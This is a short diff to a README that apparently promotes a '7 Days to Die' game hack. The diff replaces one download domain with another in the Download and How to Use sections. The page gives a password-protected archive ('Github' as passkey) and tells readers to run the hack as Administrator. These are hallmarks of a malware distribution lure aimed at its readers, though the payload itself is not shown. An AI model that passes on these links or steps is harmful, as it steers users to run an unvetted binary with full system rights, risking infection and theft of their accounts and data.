@@ -6,7 +6,7 @@
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular mods like **7D2D Mod Launcher**, **SphereII Mods**, and **SMX**
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch 7 Days to Die.
 4. Run the hack **as Administrator**.
